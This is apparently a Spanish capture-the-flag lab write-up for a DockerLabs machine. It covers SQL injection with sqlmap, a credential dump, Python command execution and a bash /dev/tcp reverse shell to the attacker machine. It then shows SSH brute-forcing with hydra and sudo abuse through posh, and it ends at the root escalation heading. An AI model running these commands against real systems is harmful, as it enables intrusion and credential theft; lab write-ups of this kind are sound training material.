## DockerLab Showtime
Primero, con el comando de ping -c 1 haremos una comprobacion de la ping y ademas, podremos obtener el ttl que nos dira el OS objetivo:

<img width="477" height="57" alt="Captura de pantalla 2025-09-14 182153" src="https://github.com/user-attachments/assets/44248241-877a-4dbc-a161-037c1d001234" />

Ahora realizamos este comando para saber que puertos tiene la conexion y si estan abiertos:

```
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```
Obtenemos que hay 2 puertos abiertos y uno, que es tipo 80 esta asginado al servicio http por lo tanto estamos atacando un servicio de pagina web

<img width="657" height="389" alt="image" src="https://github.com/user-attachments/assets/c1303eaa-3929-4be9-a8b5-fd17c74b638e" />

Podemos ver que estamos atacando una pagina web:

<img width="1329" height="677" alt="image" src="https://github.com/user-attachments/assets/8ad0e8f0-c61b-46a7-942a-2488ddc96a6f" />

Entonces, la revisaremos y buscaremos posibles zonas en las que se puedan hacer inputs de texto.

<img width="422" height="416" alt="image" src="https://github.com/user-attachments/assets/9979afdf-2526-4d1d-a6f6-5642c7e00dc3" />

Al darnos cuenta de que tiene Login, entonces trataremos de realizar una prueba de pentesting con inyeccion sql

<img width="467" height="377" alt="image" src="https://github.com/user-attachments/assets/a7f4d44c-0827-4f08-b4ac-df6053c5a45c" />

Como es evidente, la pagina web es vulnerable a inyeccion sql, por lo tanto usaremos la herramienta de burpsuite para capturar y guardar la peticion de ingreso de inicio de sesion
Capturamos el request y lo guardamos como un archivo llamado req.

<img width="1022" height="318" alt="image" src="https://github.com/user-attachments/assets/b4f743e0-408a-45bf-b5be-1eec35ce31e4" />

Ahora, vamos a nuestra maquina atacante y ejecutamos el siguiente codigo de sqlmap, para buscar la base de datos que este asociada a la pagina web

```
sqlmap -r req --dbs --batch
```
Obtenemos como resultado que hay 5 bases de datos disponibles, entre ellas una base de datos de usuarios:

<img width="237" height="105" alt="image" src="https://github.com/user-attachments/assets/2c23d71f-b23d-4ffc-8604-542da8685063" />

A traves de este comando de sqlmap, accedermos a la base de datos de usuarios:

```
sqlmap -r req --dbs --batch -D 'users' --dump
```

Obtenemos como resultado 3 usuarios y sus password:

<img width="372" height="159" alt="image" src="https://github.com/user-attachments/assets/39ce3ffb-4b23-409f-b256-00c05be75803" />

Al iniciar sesion con las credenciales de joe, podemos ver que accedemos a un panel de administracion que puede recibir como parametros comandos de python.

<img width="1334" height="292" alt="image" src="https://github.com/user-attachments/assets/3ad41be5-5bc8-44de-87fb-1ae1638248b8" />

Ahora bien, aprovechando esta vulnerabilidad, ejecutaremos el siguiente codigo:

```
import os
os.system("ls")
```

Obtenemos que si se ejecuta y muestra los archivos dentro del directorio del programa

<img width="399" height="479" alt="image" src="https://github.com/user-attachments/assets/f9b7ffa3-b484-487c-a663-9bc9a549820a" />

Efectivamente ejecuta comandos, así que podremos ejecutarnos una reverse shell con el siguiente comando:

```
import os
os.system("bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'")
```
Y en nuestra máquina atacante.

```
nc -nlvp 443
```

Obtendremos acceso a la shell

<img width="626" height="77" alt="image" src="https://github.com/user-attachments/assets/d0e0818c-f0e6-4013-8c5e-39f77ef14b48" />

Al ejecutar el comando de:

```
ls -laA /tmp
```
Obtenemos:

<img width="521" height="96" alt="image" src="https://github.com/user-attachments/assets/b366f76b-2467-43b4-8cbe-0683fda3d556" />

Podemos ver que hay un archivo sospechoso llamado .hidden_text.txt

Al ejecutar el comando dentro de la carpeta /tmp:

```
cat .hidden_text.txt
```

Obtenemos:

<img width="539" height="368" alt="image" src="https://github.com/user-attachments/assets/0a954ded-e1d1-4871-939b-ecd58e064e6d" />

El cual copiaremos esas passwords en un pass.txt y ejecutaremos el siguiente comando para pasarlas de mayusculas a minusculas

```
cat pass.txt | tr '[:upper:]' '[:lower:]' > pass_final.txt
```

Probé con el usuario luciano pero no encontró la contraseña así que probamos con joe

```
hydra -l joe -P pass_final.txt ssh://172.17.0.2 -t 20 -V -I
```
Obtenemos que para el usuario joe, su password dada el pass.txt que generamos corresponderia a chittychittybangbang:

<img width="654" height="72" alt="image" src="https://github.com/user-attachments/assets/26bc5a19-aa04-4575-b4a3-a18ef6790905" />

Introducimos las credenciales vía ssh y podremos iniciar sesión sin problemas.

```
ssh joe@172.17.0.2
```

Y entonces, veremos que al ingresar la password obtenida de joe, podremos inciar sesion a la terminal del sistema como root:

<img width="584" height="206" alt="image" src="https://github.com/user-attachments/assets/7fdbe9a4-cce8-46a2-b49d-aab658986560" />

Al ejecutar el comando de sudo -l obtenemos que dicho usuario podra ingresar comandos como usuario luciano:

<img width="663" height="147" alt="image" src="https://github.com/user-attachments/assets/85eb5f47-d95e-4e30-8840-3b495835730d" />

Mirando en [GTFOBins](https://gtfobins.github.io/gtfobins/posh/#sudo) podremos encontrar la manera de cambiarnos de usuario por el cuál ejecute el comando, en este caso luciano.

```
sudo -u luciano /bin/posh
whoami
```
Obteniendo:

<img width="381" height="46" alt="image" src="https://github.com/user-attachments/assets/f98dc5be-34c5-4d85-af05-f91eab6a7833" />

Ejecutaremos otra vez sudo -l para ver que podemos ejecutar como root y nos saldrá lo siguiente:

<img width="663" height="145" alt="image" src="https://github.com/user-attachments/assets/a0f5a9ed-92e2-4898-94c7-290042cec009" />

### Escalada de privilegios a root
Ejecutaremos otra vez sudo -l para ver que podemos ejecutar como root y nos saldrá lo siguiente:

<img width="660" height="145" alt="image" src="https://github.com/user-attachments/assets/4ab4d4eb-def7-45f3-aa8b-fbf00304a103" />



